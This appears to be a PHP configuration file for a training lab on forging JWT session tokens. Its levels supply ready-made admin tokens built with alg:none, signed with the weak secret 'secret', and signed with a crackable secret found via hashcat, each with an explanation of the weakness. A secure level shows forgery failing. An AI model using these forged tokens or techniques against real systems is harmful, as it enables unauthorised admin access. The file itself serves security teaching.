<?php
$low = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.';
$med = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.7v0nwIzPPTFOklM2u03lKVLcgUbYPQYrRzdK5lRAln0';
$high = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.ZAOJsP0LklnRzURSK1MEbkKaU6Rr-JYQGFhsMSrVbls';
$req = fn($tok) => ['method' => 'GET', 'path' => '/labs/jwt-session/run', 'headers' => "Authorization: Bearer $tok"];
return [
  'low' => [
    'goal' => "Forge an admin token using alg:none.",
    'steps' => [
      "The server honours alg:none and skips the signature.",
      "Build a token with header {\"alg\":\"none\"} and claims {\"role\":\"admin\"}, leaving the signature empty.",
      "The ready token is loaded; send it as Authorization: Bearer.",
    ],
    'why' => "With alg:none the server trusts the claims without any signature, so you simply declare yourself admin. A token is only as trustworthy as its verified signature.",
    'run' => [$req($low)],
  ],
  'medium' => [
    'goal' => "Forge an admin token signed with a weak secret.",
    'steps' => [
      "alg:none is rejected, but the HS256 secret is the dictionary word 'secret'.",
      "Sign {\"role\":\"admin\"} with HS256 and the key secret (jwt_tool, or openssl).",
      "The precomputed signed token is loaded for you.",
    ],
    'why' => "A guessable HMAC secret lets anyone produce a valid signature, so the signature proves nothing. The forged token verifies and grants admin.",
    'run' => [$req($med)],
  ],
  'high' => [
    'goal' => "Forge an admin token by cracking the secret.",
    'steps' => [
      "HS256 is pinned, but the secret forge-2026 is crackable (hashcat -m 16500).",
      "Once recovered, sign your admin claims with it.",
      "The precomputed token signed with forge-2026 is loaded.",
    ],
    'why' => "A low-entropy secret falls to offline cracking, after which signing arbitrary tokens is trivial. Signature verification only helps if the key is strong.",
    'run' => [$req($high)],
  ],
  'secure' => [
    'goal' => "Confirm a strong secret and pinned algorithm resist forgery.",
    'steps' => [
      "The secret is 32 random bytes and HS256 is pinned.",
      "Send the alg:none token and watch it be rejected.",
    ],
    'why' => "alg:none is refused and the random secret cannot be guessed or cracked, so no forged signature verifies.",
    'run' => [$req($low)],
  ],
];
